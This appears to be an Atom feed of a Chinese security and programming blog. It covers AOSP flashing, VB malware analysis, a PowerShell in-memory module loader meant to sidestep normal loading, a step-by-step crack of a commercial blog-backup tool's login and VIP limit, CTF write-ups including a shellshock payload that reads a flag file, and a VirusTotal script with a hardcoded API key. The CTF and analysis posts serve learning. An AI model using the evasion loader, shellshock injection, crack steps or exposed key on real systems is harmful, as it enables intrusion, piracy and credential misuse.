5内核文件,拷贝到<code>/Android/aosp/device/lge/hammerhead-kernel</code>覆盖原来的文件</p><ol><li>下载驱动设备 要刷机到实体机,还需要下载三个驱动设备</li></ol><p>从<a href="https://developers.google.com/android/drivers找到对应的驱动设备。" target="_blank" rel="noopener">https://developers.google.com/android/drivers找到对应的驱动设备。</a></p><p>搜索Nexus 5找到对应的系统版本，我的是Android 4.4.4。找到的结果如下：</p><p>Nexus 5 (GSM/LTE) binaries for Android 4.4.4 (KTU84P)</p><table><thead><tr><th>Hardware Component</th><th>Company</th><th>Download</th><th>SHA-256 Checksum</th></tr></thead><tbody><tr><td>NFC, Bluetooth, Wi-Fi</td><td>Broadcom</td><td>Link</td><td>f258605e24c9c3d4e78c9af934f3516a4f8d3410da697005fad42cad36c5ed5c</td></tr><tr><td>Camera, Sensors, Audio</td><td>LG</td><td>Link</td><td>fc72704e0fba9c51c6505ae009e474570de27ee8565d51483368d8dae6c0f44e</td></tr><tr><td>Graphics, GSM, Camera, GPS, Sensors, Media, DSP, USB</td><td>Qualcomm</td><td>Link</td><td>8603d85ad511346d65c27c3747919da280523b86d55a39dfce657a4ca1b0685b</td></tr></tbody></table><p>Download对应的是下载连接，我们把这三个文件下载后解压到/Android/AOSP目录。得到三个sh脚本文件 <code>extract-broadcom-hammerhead.sh</code>、<code>extract-lge-hammerhead.sh</code>和<code>extract-qcom-hammerhead.sh</code>;</p><p>分别运行它们</p><pre><code>sh extract-broadcom-hammerhead.shsh extract-lge-hammerhead.shsh extract-qcom-hammerhead.sh</code></pre><p>一直按回车，等到如下提示输入 I ACCEPT。</p><pre><code>Type &quot;I ACCEPT&quot; if you agree to the terms of the license: You didn&#39;t accept the license. Extraction aborted.</code></pre><ol><li>再次编译源码 再次运行编译脚本重新编译,这次会很快</li></ol><pre><code>sh ./build-kitkat.sh</code></pre><h2 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h2><p>先确定bootloader有没有解锁,没解锁是刷不进去的。</p><p>Nexus 5 是两个音量键和开机键一起一直按到出现bootloader界面。usb连接手机，输入以下命令</p><pre><code class="bash">fastboot oem unlock</code></pre><p>这个是Nexus 5的解锁方式</p><p>Android源码编译成功后,文件保存在<code>/Android/aosp/out/target/product/hammerhead</code>。</p><p>输入如下命令就可以刷入实体机了。</p><pre><code class="bash">cd /Android/aosp/out/target/product/hammerheadAdb reboot bootloaderFastboot -w flashall</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.csdn.net/gaisylly/article/details/50113791" target="_blank" rel="noopener">http://blog.csdn.net/gaisylly/article/details/50113791</a><br><a href="https://github.com/tiann/docker-aosp" target="_blank" rel="noopener">https://github.com/tiann/docker-aosp</a><br><a href="http://weishu.me/2016/12/30/simple-way-to-compile-android-source/" target="_blank" rel="noopener">http://weishu.me/2016/12/30/simple-way-to-compile-android-source/</a><br><a href="http://bbs.pediy.com/thread-213481.htm" target="_blank" rel="noopener">http://bbs.pediy.com/thread-213481.htm</a><br><a href="http://blog.csdn.net/sunao2002002/article/details/53057374" target="_blank" rel="noopener">http://blog.csdn.net/sunao2002002/article/details/53057374</a><br><a href="https://developers.google.com/android/drivers" target="_blank" rel="noopener">https://developers.google.com/android/drivers</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;看了很多编译源码的文章，发现很多都有坑，大部分都是环境配置问题，编译不同版本的源码jdk版本不一样，ubuntu版本也不一样。这很让人蛋疼，光是折腾环境就得半天了。&lt;/p&gt;
&lt;p&gt;自从有了docker就不一样了，有人把Android源码编译的环境打包成了docker，就是AOSP docker;这样我们就不需要去折腾环境,直接拿人家弄好的来用。&lt;/p&gt;
&lt;p&gt;推荐使用linux装docker，不用管是debian还是ubuntu;虽然windows也可以使用docker，但是还是有点小问题。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>VB Crypt Payload</title>
    <link href="http://shxi.me/posts/27be2f79.html"/>
    <id>http://shxi.me/posts/27be2f79.html</id>
    <published>2018-02-28T22:53:37.000Z</published>
    <updated>2018-06-09T01:29:42.584Z</updated>
    
    <content type="html"><![CDATA[<p>分析VB样本的时候发现有几种混淆方式，记录下。</p><h2 id="替换函数指针"><a href="#替换函数指针" class="headerlink" title="替换函数指针"></a>替换函数指针</h2><blockquote><p>样本shah:a66f989e58ada2eff729ac2032ff71a159c521e7372373f4a1c1cf13f8ae2f0c</p></blockquote><p> 载入vb.idc脚本，脚本分析完后，查看event handle函数，</p><pre><code> .text:00463E14 _O_Pub_Obj_Inf1_Ctl_Inf0x3_0x7_lpForm_Load        dd offset Hdr_Jmp_Addr_0x46549A      ; Ptr to Form Load Event Code. .... .text:00463E78                 sub     [esp+arg_0], 0FFFFh .text:00463E80                 jmp     _O_Pub_Obj_Inf1_Method0x1 .text:00463E85          Hdr_Jmp_Addr_0x46549A:       ; DATA XREF:.text:_O_Pub_Obj_Inf1_Ctl_Inf0x3_0x7_lpForm_Load↑o .text:00463E85                 sub     dword ptr [esp+4], 3Bh ; &#39;;&#39; ; Flags and Code Address .text:00463E8D                 jmp     _O_Pub_Obj_Inf1_Event0x2</code></pre><p><code>_O_Pub_Obj_Inf1_Event0x2</code>就是处理Form_load的函数，一般malicious code都是在这里实现。<br>接着往下看。<br>这里计算处shellcode的地址。<code>0x43AF4B=1526C77h/（sqr(25.0)）</code></p><pre><code class="asm">.text:00465D83                        mov     [ebp+var_50], 1526C77h.text:00465D8A                        fld     ds:dbl_401118   ;25.0.text:00465D90                        push    ecx.text:00465D91                        push    ecx.text:00465D92                        fstp    qword ptr [esp+8+var_8].text:00465D95                        call    rtcSqr.text:00465D9A                        call    __vbaFpI4.text:00465D9F                        mov     ecx, eax</code></pre><p>在 <code>[eax+0x6f8]</code> 这个函数将shellcode地址替换，arg_0为Form_load的第一个参数，也就是Form类。</p><pre><code class="asm">.text:00465DA8                        mov     eax, [ebp+arg_0].text:00465DAB                        mov     eax, [eax].text:00465DAD                        push    [ebp+arg_0].text:00465DB0                        call    dword ptr [eax+6F8h]</code></pre><p>[eax]中存放的是地址虚表，[eax+6f8h]地址正好是_O_Pub_Obj_Inf1_Method0x1方法,</p><pre><code class="asm">.data:0046737C dd offset msvbvm60_BASIC_CLASS_QueryInterface.data:00467380 dd offset msvbvm60_BASIC_CLASS_AddRef.data:00467384 dd offset msvbvm60_BASIC_CLASS_Release....data:00467A6C dd 72A44A98h.data:00467A70 dd 72A44AA0h.data:00467A74 dd 463E80h                 ; ptr _O_Pub_Obj_Inf1_Method0x1.data:00467A78 dd 463E8Dh                 ; ptr _O_Pub_Obj_Inf1_Event0x2 ...</code></pre><p>替换指针，进入shellcode执行代码</p><pre><code>.text:00464434 add     eax, 2B0h.text:00464439 jo      loc_465495.text:0046443F mov     [ebp+var_20], eax.text:00464442 push    [ebp+arg_4] ;shellcode地址.text:00464445 push    [ebp+var_20] ;[eax+0x2b0].text:00464448 call    replace_ptr.....text:004644C3 call    dword ptr [eax+2B0h]</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;分析VB样本的时候发现有几种混淆方式，记录下。&lt;/p&gt;
&lt;h2 id=&quot;替换函数指针&quot;&gt;&lt;a href=&quot;#替换函数指针&quot; class=&quot;headerlink&quot; title=&quot;替换函数指针&quot;&gt;&lt;/a&gt;替换函数指针&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;样本shah:a66
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>内存中加载modlue</title>
    <link href="http://shxi.me/posts/a9796658.html"/>
    <id>http://shxi.me/posts/a9796658.html</id>
    <published>2018-02-20T20:44:29.000Z</published>
    <updated>2018-04-14T04:34:12.904Z</updated>
    
    <content type="html"><![CDATA[<script src="https://cdn.bootcss.com/highlight.js/9.12.0/languages/powershell.min.js"></script><p>内存中加载modlue</p><pre><code class="powershell">    $Domain = [AppDomain]::CurrentDomain    $DynAssembly = New-Object System.Reflection.AssemblyName(&#39;TempAssembly&#39;)    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(&#39;TempModule&#39;)    $ModuleBuilder2 = $AssemblyBuilder.DefineDynamicModule(&#39;hello.dll&#39;)    $TypeBuilder = $ModuleBuilder.DefineType(&#39;TempClass&#39;, [Reflection.TypeAttributes]::Public)    $TypeBuilder.CreateType()    $HelloDllBytes = [Convert]::FromBase64String(&#39;{PE base64}&#39;)    # Calling LoadModule doesn&#39;t pass through the internal nLoad method like Assembly/AppDomain.Load does. :)    $HelloDllModule = [TempClass].Assembly.LoadModule(&#39;hello.dll&#39;, $HelloDllBytes)    # Invoke the Hello method within the hello.dll module that was loaded in memory    $HelloDllModule.GetTypes()[0].GetMethod(&#39;Hello&#39;).Invoke($null, @())</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;https://cdn.bootcss.com/highlight.js/9.12.0/languages/powershell.min.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;内存中加载modlue&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;powers
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>豆约翰博客备份专家破解</title>
    <link href="http://shxi.me/posts/9d7b1fcb.html"/>
    <id>http://shxi.me/posts/9d7b1fcb.html</id>
    <published>2016-10-30T12:14:54.000Z</published>
    <updated>2018-04-04T16:57:40.444Z</updated>
    
    <content type="html"><![CDATA[<p>文笔不好，路过的看官求勿喷。</p><p>官网下载程序，解压用dnspy来调试主程序BlogDownloader.exe;虽然被混淆，但这样的保护形同虚设，很容易通过动态调试被破解。<br><img src="http://t.cn/RVuofGm" alt=""></p><p>F5开始调试。<br><img src="http://t.cn/RVuoITs" alt=""></p><p>点击ok，程序会出现登陆框，要输入账号密码。第一步我们先实现免账号登陆，先随便输个账号密码，利用堆栈回溯来找到下图中高亮部分，这里面就是登陆流程部分。<br><img src="http://t.cn/RVuoMD5" alt=""></p><p>跳转到目标代码，很明显就是对账号密码的判断，我们只要将第一个判断语句的等于改成不等于，空账号登陆。</p><p><img src="http://t.cn/RVuoJ4G" alt=""><br><a id="more"></a><br>选中第一行if判断语句，右键编辑IL指令。<br><img src="http://t.cn/RVuoiQB" alt=""><br>再来看看修改后的语句，等于号已经换成不等于了。<br><img src="http://t.cn/RVuo6BW" alt=""></p><p>修改完成后，我们需要将我们修改的内容保存到文件。文件菜单中选保存模块或者保存所有来把修改后的文件保存到新文件。用这个文件替换原来的文件就ok了。</p><p>现在不需要账号就能使用了，但是还是有限制，只能下载5篇博客，</p><p>字符串搜索vip，找到如下结果。<br><img src="http://t.cn/RVuoSGH" alt=""></p><p>选中m_bVip 按下Ctrl+R,发现m_bVip在如下图地方被赋值，直接修改false为true,就没有只能下5篇博客的限制。<br><img src="http://t.cn/RVuoKeA" alt=""><br>同样是编辑il指令。<br><img src="http://t.cn/RVuooCA" alt=""></p><p>修改完成后保存到文件，注意此处属于BlogGather.dll文件的代码部分，用这个文件替换BlogGather.dll就可以去掉只能下载5篇博客的限制。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文笔不好，路过的看官求勿喷。&lt;/p&gt;
&lt;p&gt;官网下载程序，解压用dnspy来调试主程序BlogDownloader.exe;虽然被混淆，但这样的保护形同虚设，很容易通过动态调试被破解。&lt;br&gt;&lt;img src=&quot;http://t.cn/RVuofGm&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;F5开始调试。&lt;br&gt;&lt;img src=&quot;http://t.cn/RVuoITs&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;点击ok，程序会出现登陆框，要输入账号密码。第一步我们先实现免账号登陆，先随便输个账号密码，利用堆栈回溯来找到下图中高亮部分，这里面就是登陆流程部分。&lt;br&gt;&lt;img src=&quot;http://t.cn/RVuoMD5&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;跳转到目标代码，很明显就是对账号密码的判断，我们只要将第一个判断语句的等于改成不等于，空账号登陆。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://t.cn/RVuoJ4G&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python selenium 3 + Firefox 48+ 报错解决方法</title>
    <link href="http://shxi.me/posts/e8a649b6.html"/>
    <id>http://shxi.me/posts/e8a649b6.html</id>
    <published>2016-10-26T12:47:23.000Z</published>
    <updated>2018-04-04T16:57:40.440Z</updated>
    
    <content type="html"><![CDATA[<p>这里记录下使用selenium碰到的问题。</p><p>报错信息如下时：</p><pre><code>selenium.common.exceptions.WebDriverException: Message: &#39;geckodriver&#39; executable needs to be in PATH.       </code></pre><p>这是因为在Firefox高版本需要使用 <strong>geckodriver</strong>来驱动,不再使用Seleniu默认自带的Firefox webdriver。</p><p>我们只需要在下面这个地址下载<strong>geckodriver</strong>并将 其所在的路径设为环境变量即可解决。</p><p><a href="https://github.com/mozilla/geckodriver/releases" target="_blank" rel="noopener">https://github.com/mozilla/geckodriver/releases</a></p><p>当报如下错误信息时，则是</p><pre><code>selenium.common.exceptions.WebDriverException: Message: Expected browser binary location, but unable to find binary in default location, no &#39;moz:firefoxOptions.binary&#39; capability provided, and no binary flag set on the command line</code></pre><p>这时我们需要指定Firefox浏览器程序路径。</p><pre><code class="python">binary = FirefoxBinary(&#39;D:\\Firefox\\Firefox\\firefox.exe&#39;)driver = webdriver.Firefox(firefox_binary=binary)</code></pre><p>这样就能正常使用了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这里记录下使用selenium碰到的问题。&lt;/p&gt;
&lt;p&gt;报错信息如下时：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;selenium.common.exceptions.WebDriverException: Message: &amp;#39;geckodriver&amp;#39; execut
      
    
    </summary>
    
      <category term="python" scheme="http://shxi.me/categories/python/"/>
    
    
  </entry>
  
  <entry>
    <title>pycharm 远程调试kodi python plugin</title>
    <link href="http://shxi.me/posts/8a11904.html"/>
    <id>http://shxi.me/posts/8a11904.html</id>
    <published>2016-06-18T07:23:11.000Z</published>
    <updated>2018-04-04T16:57:40.436Z</updated>
    
    <content type="html"><![CDATA[<p>kodi是什么我就不说了，附上一张我的kodi插件图。这个播放器最强大的功能就是支持python编写的插件。</p><p> <img src="http://t.cn/R5Kc2nO" alt=""></p><p> 但是有些老的插件作者已经不打算更新或维护了，使用的话又会有一些问题，这时就需要调试来修复问题了。<br> 我最近使用的爱奇艺播放插件作者也是好久没更新，有了这个插件都不用去买爱奇艺VIP了，播放也没有广告。</p> <a id="more"></a><p> 官方教程是使用Eclipse来调试，但是这个并不是很好用。网上也没有相关的资料。<br> <a href="kodi.wiki/view/How-to:Debug_Python_Scripts_with_Eclipse" title="Debug_Python_Scripts_with_Eclipse">Debug_Python_Scripts_with_Eclipse</a></p><p> 这里我就介绍如何使用pycharm这款python IDE来远程调试Kodi python插件。</p><h2 id="pycharm安装pydevd"><a href="#pycharm安装pydevd" class="headerlink" title="pycharm安装pydevd"></a>pycharm安装pydevd</h2><p> pydevd是用来调试的模块，安装也比较简单，直接运行</p><pre><code>pip install pydevd</code></pre><p>或者使用pycharm安装</p><p>选择File → Setting → Project:Addons → Project:Interpreter 单击右边绿色的 + 号，在弹出的窗口输入<code>pydevd</code>单击下方的<code>install package</code>。</p><p><img src="http://t.cn/R5KcyQz" alt=""></p><h2 id="开始远程调试"><a href="#开始远程调试" class="headerlink" title="开始远程调试"></a>开始远程调试</h2><p>在开始调试前，我们还需要配置一些选项。</p><p>首先用pycharm打开kodi的插件目录，我的插件目录在<br><code>C:\Users\Ken\AppData\Roaming\Kodi\addons</code>,具体路径可能会因为版本和系统或其他的原因不同。<br><img src="http://t.cn/R5KcUFy" alt=""><br>文件夹名类似上图那就对了。</p><p>选择菜单Run → Edit Configurations打开下图窗口。单击绿色的 + 号 选择python remote debug。<br><img src="http://t.cn/R5Kcb4k" alt=""></p><p>把ip和端口设置好，这里我们需要将3处的代码粘贴到你想要断下的地方，这里3处的代码是</p><pre><code>pydevd.settrace(&#39;localhost&#39;, port=56789, stdoutToServer=True, stderrToServer=True)</code></pre><p>kodi自己并没有pydevd模块，也就是说我们必须自己从外部导入pydevd模块。在pycharm的debug-eggs文件夹有两个文件，这时用来调试的，如果是python3，则需要用<code>pycharm-debug-py3k.egg</code>,</p><p>将此文件添加至pythonpath然后导入pydevd。<br><img src="http://t.cn/R5KctKL" alt=""></p><p>开始调试，<br><img src="http://t.cn/R5Kc5c2" alt=""></p><p>在playvideo处设置了远程断点，当开始播放视频时断下。<br><img src="http://t.cn/R5KcGkK" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;kodi是什么我就不说了，附上一张我的kodi插件图。这个播放器最强大的功能就是支持python编写的插件。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://t.cn/R5Kc2nO&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt; 但是有些老的插件作者已经不打算更新或维护了，使用的话又会有一些问题，这时就需要调试来修复问题了。&lt;br&gt; 我最近使用的爱奇艺播放插件作者也是好久没更新，有了这个插件都不用去买爱奇艺VIP了，播放也没有广告。&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://shxi.me/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Reversing.kr Flash Encrypt</title>
    <link href="http://shxi.me/posts/672ac0b8.html"/>
    <id>http://shxi.me/posts/672ac0b8.html</id>
    <published>2016-04-09T03:37:51.000Z</published>
    <updated>2018-04-04T16:57:40.425Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://t.cn/RqaVxsK" alt=""><br>一个swf文件，用浏览器或者播放器打开如上图。在编辑框输入正确的数值再按下按钮，编辑框和按钮会在另外一个位置出现，到最后输入正确的值会显示正确的key<br><img src="http://ww2.sinaimg.cn/large/005Afi4Gjw1f2yil169puj30fo082t8s.jpg" alt=""></p><p>我们使用ffdec来反编译这个swf文件，<br><img src="http://t.cn/RqaV6l4" alt=""></p><a id="more"></a><p>这个swf由很多个不同的frame组成，除了显示key的那个frame，每个frame都只有编辑框和按钮，只是位置不断变化。<br>鼠标选择对应的对象，在上方会显示相应的属性，如下图，我选中的按钮按钮名是<code>DefineButton2 (9)</code><br><img src="http://t.cn/RqaVSPB" alt=""></p><p>swf一般都是从frame1开始的，选中frame1，按钮名是<code>DefineButton2 (4)</code></p><p>来看<code>DefineButton2 (4)</code>的脚本代码<br><img src="http://t.cn/RqaVSgO" alt=""></p><p>这里有个spw变量，其实就是编辑框用来保存我们输入数据的变量。<br>frame1的编辑框对应的是<code>DefineEditText (6)</code>,变量是<code>spw</code>。如下图，<br><img src="http://t.cn/RqaVKJr" alt=""></p><p>这段代码<code>spw</code> 也就是我们输入的数据等于<code>1456</code>就会跳转到frame3执行。gotoandplay是跳转到某frame的函数。 </p><p>frame3对应的按钮是<code>DefineButton2 (7)</code>，大家看到没，这里的变量变了，因为frame3的编辑框是用<code>spwd</code>来存储我们输入的数据不是<code>spw</code>,计算出的结果是</p><pre><code class="bash">spwd = 8 spw = 1456/8 = 182</code></pre><p><img src="http://t.cn/RqafPns" alt=""></p><p>后面也是一样，每次都输入正确的话key就会出来了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://t.cn/RqaVxsK&quot; alt=&quot;&quot;&gt;&lt;br&gt;一个swf文件，用浏览器或者播放器打开如上图。在编辑框输入正确的数值再按下按钮，编辑框和按钮会在另外一个位置出现，到最后输入正确的值会显示正确的key&lt;br&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/005Afi4Gjw1f2yil169puj30fo082t8s.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们使用ffdec来反编译这个swf文件，&lt;br&gt;&lt;img src=&quot;http://t.cn/RqaV6l4&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="challenge" scheme="http://shxi.me/categories/challenge/"/>
    
    
      <category term="Reversing" scheme="http://shxi.me/tags/Reversing/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr shellshock</title>
    <link href="http://shxi.me/posts/8f13cc3.html"/>
    <id>http://shxi.me/posts/8f13cc3.html</id>
    <published>2016-04-03T13:21:09.000Z</published>
    <updated>2018-04-04T16:57:40.415Z</updated>
    
    <content type="html"><![CDATA[<p>这道题比较简单，对”破壳”漏洞了解的同学都能做出来。</p><pre><code class="c++">#include &lt;stdio.h&gt;                                                int main(){                                                               setresuid(getegid(), getegid(), getegid());                       setresgid(getegid(), getegid(), getegid());                       system(&quot;/home/shellshock/bash -c &#39;echo shock_me&#39;&quot;);               return 0;                                                 }                                                                 </code></pre><p>源码中调用了题目提供的有漏洞的bash,我们可以构造如下命令来打印出flag:</p><pre><code>    env x=&#39;() { :;}; /bin/cat flag&#39; ./shellshock</code></pre><p>上面这条命令相当于直接使用shellshcok调用的bash直接执行了<code>/bin/cat flag</code>,</p><pre><code class="bash">shellshock@ubuntu:~$ env x=&#39;() { :;}; /bin/cat flag&#39; ./shellshock    only if I knew CVE-2014-6271 ten years ago..!!                       Segmentation fault                                                   </code></pre><p>先了解这个漏洞的同学可以看看这两篇文章</p><p><a href="http://coolshell.cn/articles/11973.html" target="_blank" rel="noopener">bash代码注入的安全漏洞</a><br><a href="http://drops.wooyun.org/papers/3268" target="_blank" rel="noopener">Shellshock漏洞回顾与分析测试</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这道题比较简单，对”破壳”漏洞了解的同学都能做出来。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;c++&quot;&gt;#include &amp;lt;stdio.h&amp;gt;                                                
int main()
      
    
    </summary>
    
      <category term="challenge" scheme="http://shxi.me/categories/challenge/"/>
    
    
      <category term="Pwnable" scheme="http://shxi.me/tags/Pwnable/"/>
    
  </entry>
  
  <entry>
    <title>VirusTotal扫描器 python版</title>
    <link href="http://shxi.me/posts/62077d14.html"/>
    <id>http://shxi.me/posts/62077d14.html</id>
    <published>2016-03-16T19:30:31.000Z</published>
    <updated>2018-04-04T16:57:40.427Z</updated>
    
    <content type="html"><![CDATA[<p>利用在线查毒网站<a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a> 提供的API实现上传文件返回扫描结果，因为我平时只看查毒结果，因此只是简单的把文件上传然后返回分析结果。<br>代码如下：</p><a id="more"></a><pre><code class="python">#coding:gb2312from poster.encode import multipart_encode  # easy_install posterfrom poster.streaminghttp import register_openersimport urllib2,urllib,simplejson,sys,hashlib,osapikey = {&#39;apikey&#39;: &#39;fa07ea9eddbc8ef8d6e6c0b433030230f7785d3aca1da3dbdb19762455a82ad7&#39;}url = &#39;https://www.virustotal.com/vtapi/v2/file/&#39;virustotalAPI = {&#39;scan&#39;:url+&#39;scan&#39;,&#39;rescan&#39;:url+&#39;rescan&#39;,&#39;reports&#39;:url+&#39;report&#39;}def scan(filepath):    #发送post    register_openers()    file =  open(filepath, &quot;rb&quot;)    params = {&#39;file&#39;: file}    params.update(apikey)    datagen, headers = multipart_encode(params)    #计算文件的md5，先查询vt上是否有该样本，如果有直接返回结果，如果没有上传文件再返回结果    m2 = hashlib.md5()    m2.update(file.read())    json = report(m2.hexdigest())    if json[&#39;response_code&#39;] == 1:        reportformat(json)    else:        request = urllib2.Request(virustotalAPI[&#39;scan&#39;], datagen, headers)        result = simplejson.loads(urllib2.urlopen(request).read())        reportformat(report(result[&#39;resource&#39;]))def report(resource ):    parameters = {&quot;resource&quot;:resource}    parameters.update(apikey)    req  = urllib2.Request(virustotalAPI[&#39;reports&#39;], urllib.urlencode(parameters))    str = urllib2.urlopen(req).read()    if str == &#39;&#39;:        print &#39;获取扫描结果失败,请稍后再试&#39;        exit(1)    reportjson =  simplejson.loads(str)    return reportjsondef reportformat(json):    # 格式化输出返回的结果    if json[&#39;response_code&#39;] == 1:        print &#39;scan_date\t&#39; + json[&#39;scan_date&#39;]        print &#39;scan result %d/%d&#39;%(json[&#39;positives&#39;],json[&#39;total&#39;])        for u in json[&#39;scans&#39;]:            virus = json[&#39;scans&#39;][u]            print &#39;\t{0:&lt;20}\t{1:&lt;40}\t{2:&lt;10}&#39;.format(u,virus[&#39;result&#39;],virus[&#39;update&#39;])    else :        print &#39;请求的资源扫描未完成，请稍后再试&#39;def main(argv):  scan(argv[1])if __name__ == &#39;__main__&#39;:    main(sys.argv)</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;利用在线查毒网站&lt;a href=&quot;https://www.virustotal.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.virustotal.com/&lt;/a&gt; 提供的API实现上传文件返回扫描结果，因为我平时只看查毒结果，因此只是简单的把文件上传然后返回分析结果。&lt;br&gt;代码如下：&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://shxi.me/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>pycurl 分块下载</title>
    <link href="http://shxi.me/posts/6155f940.html"/>
    <id>http://shxi.me/posts/6155f940.html</id>
    <published>2016-03-06T15:26:55.000Z</published>
    <updated>2018-04-04T16:57:40.435Z</updated>
    
    <content type="html"><![CDATA[<p>写爬虫时要下载文件，谁知道文件比较大，然后在下载时候总是丢包，因此参考网上的一些源码写了实现分块下载的功能,有能力的童鞋可以自己改写成多线程的。<br>这个pycurl的分块下载功能我把它封装成了一个类，直接使用即可,接收5个参数,用法如下</p><pre><code class="python">    d = downloader(downloadurl,out_filePath,None,None,None)    d.download() #调用下载功能下载</code></pre><a id="more"></a><p>完整代码如下:</p><pre><code class="python">import pycurl# 设置curl对象 的proxy reffer cookiesdef SetOpt(target_address,proxy=None,reffer=None,cookies=None):        c = pycurl.Curl()        c.setopt(pycurl.URL,target_address)        if proxy != None:            c.setopt(pycurl.PROXY,proxy)    # 设置代理        if reffer != None:            c.setopt(pycurl.REFERER,reffer)        if cookies !=None:            c.setopt(pycurl.COOKIE,cookies)        return cclass downloader:    def __init__(self,target_address,out_filePath,reffer,cookies,proxy):        print out_filePath        self.output_file=out_filePath       # 输出路径        self.chunk=1*1024*1024              # 设置每次下载的块大小        #创建存放文件的目录        try:            self.dir_name=self.output_file+&quot;tmp&quot;            print self.dir_name            os.mkdir(self.dir_name)        except OSError:            pass        ######### 设置CURL对象 ######        self.curl_obj= SetOpt(target_address,reffer=reffer,cookies=cookies)        ## 临时的curl对象，用来获取文件的大小        tmp_curl_obj = SetOpt(target_address,reffer=reffer,cookies=cookies)         ##### 得到并设置下载文件的大小 ######        tmp_curl_obj.setopt(tmp_curl_obj.NOBODY,True)  #获取的文件内容不包含body部分        try:            print &quot;Trying to get size of the file&quot;            tmp_curl_obj.perform()            self.size = tmp_curl_obj.getinfo(tmp_curl_obj.CONTENT_LENGTH_DOWNLOAD) #文件大小            print  self.size        except Exception, e:            print e            self.delete_temp()            self.size = 0        #打印进度#        self.curl_obj.setopt(self.curl_obj.NOPROGRESS,1)        self.curl_obj.setopt(self.curl_obj.PROGRESSFUNCTION,self.progress)    ##### 下载 ######    def download(self):        if (self.size&gt;0):            print &quot;Starting download. Total size: &quot;+str(self.size)+&quot; bytes or &quot;+str(self.size/1024/1024)+&quot; MB&quot;            else:            print &quot;Starting download&quot;        #####  如果文件大小小于或等于块大小  就直接下载 不用分块了 #####        if self.size &lt;=self.chunk or self.size&lt;0:            self.curl_obj.fp = open(self.output_file, &quot;wb&quot;)            self.curl_obj.setopt(pycurl.WRITEDATA, self.curl_obj.fp)            self.curl_obj.perform()            self.curl_obj.fp.close()            return        #####  设置超时时间   #####        self.curl_obj.setopt(pycurl.TIMEOUT,60*10)        log=open(&quot;downloader.log&quot;,&quot;a&quot;)        # lim_l  块头 lim_u 块尾  如lim_l=0,lim_u=1023, 则这个块就是 0-1023        lim_l=0        lim_u=self.chunk  # 0 - 1M        i=1  #分块编号        ###### 下载文件  #####        while lim_l &lt; self.size :              temp_output=os.path.join(self.dir_name,&quot;output&quot;+str(i))            ###### 如果该分块已经存在且大小等于块大小1024*1024 说明该分块已经下载完成，继续下一次循环  #####            if os.path.exists(temp_output) and os.path.getsize(temp_output)==self.chunk:                #print &quot;skip chunk &quot;, i, lim_l                i=i+1                r=str(lim_l)+&quot;-&quot;+str(lim_u-1)  # 下载的文件分块范围 如 0-(1M-1)、 (1M-(2M-1))....                lim_l=lim_l+self.chunk                lim_u=lim_u+self.chunk                continue            #####  分块没有被下载则开始下载  #####            self.curl_obj.fp = open(temp_output, &quot;wb&quot;)            self.curl_obj.setopt(pycurl.WRITEDATA, self.curl_obj.fp)            r=str(lim_l)+&quot;-&quot;+str(lim_u-1)            self.curl_obj.setopt(pycurl.RANGE,r)            print &quot;download chunk&quot;, i            ##### 下载文件   #####            while True:                ##### 下载完成跳出这个循环  #####                try:                    self.curl_obj.perform()                    self.curl_obj.fp.close()                    break                ###### 异常则继续下载  #####                except pycurl.error, e:                    logmsg = &quot;Pycurl error caught &quot;+str(e)+&quot; while downloading at download range &quot;+str(r)+&quot; while storing to file &quot;+str(temp_output)+&quot;\n&quot;                    log.write(logmsg)                    print &quot;download {} exception&quot;.format(i)                    self.curl_obj.fp.close()                    self.curl_obj.fp=open(temp_output,&quot;wb&quot;)                    continue            i=i+1            lim_l=lim_l+self.chunk            lim_u=lim_u+self.chunk    ##### 删除下载的临时文件  #####    def delete_temp(self):        i=1        while True:            temp_output=os.path.join(self.dir_name,&quot;output&quot;+str(i))            if os.path.exists(temp_output):                os.remove(temp_output)            else:                break            i=i+1        try:            os.rmdir(self.dir_name)        except Exception, e:            pass    #####  合并文件  #####    def concatenate(self):        